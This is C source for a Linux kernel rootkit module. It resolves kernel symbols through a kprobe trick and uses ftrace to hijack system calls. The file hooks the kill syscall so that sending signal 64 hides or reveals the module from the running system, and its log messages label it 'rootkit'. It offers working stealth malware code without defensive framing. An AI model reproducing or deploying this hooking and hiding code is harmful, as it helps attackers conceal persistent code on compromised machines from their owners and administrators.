#include"hook_syscall.h"

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

static int fh_resolve_hook_address(struct ftrace_hook *hook){
#ifdef KPROBE_LOOKUP
    unsigned long(*kallsyms_lookup_name)(const char *name); 
    register_kprobe(&kp);
    kallsyms_lookup_name =(unsigned long (*)(const char *)) kp.addr;
    unregister_kprobe(&kp);
#endif
    hook->address = kallsyms_lookup_name(hook->name);

    if (!hook->address){
        printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }
    *((unsigned long*) hook->original) = hook->address;
    return 0;
}


// Have the callbacks receive a struct ftrace_regs instead of pt_regs: 
// https://github.com/torvalds/linux/commit/d19ad0775dcd64b49eecf4fa79c17959ebfbd26b
#if (LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0))
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs){
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if(!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;
}
#else
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *regs){
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if(!within_module(parent_ip, THIS_MODULE))
        regs->regs.ip = (unsigned long) hook->function;
}
#endif

int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = fh_resolve_hook_address(hook);
    if(err)
        return err;

    hook->ops.func = fh_ftrace_thunk;

// 5.11 FTRACE_OPS_FL_RECURSION_SAFE changed
#if (LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0))
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
            | FTRACE_OPS_FL_RECURSION_SAFE
            | FTRACE_OPS_FL_IPMODIFY;

#else 
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
            | FTRACE_OPS_FL_RECURSION
            | FTRACE_OPS_FL_IPMODIFY;
#endif

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

static void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

static int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0 ; i < count ; i++)
    {
        err = fh_install_hook(&hooks[i]);
        if(err)
            goto error;
    }
    return 0;

error:
    while (i != 0)
    {
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}
static void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    for (i = 0 ; i < count ; i++)
        fh_remove_hook(&hooks[i]);
}


static unsigned short hidden=0;
static asmlinkage long (*orig_kill)(const struct pt_regs *);
asmlinkage int hook_kill(const struct pt_regs *regs)
{
    // pid_t pid = regs->di;
    int sig = regs->si;

    if ( (sig == 64) && (hidden == 0) )
    {
        printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
        hideme();
        hidden = 1;
    }
    else if ( (sig == 64) && (hidden == 1) )
    {
        printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
        showme();
        hidden = 0;
    }
    else
    {
        return orig_kill(regs);
    }
    return 0;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

int hook_syscall_init(void){
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;
    return 0;
}

void hook_syscall_exit(void){
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
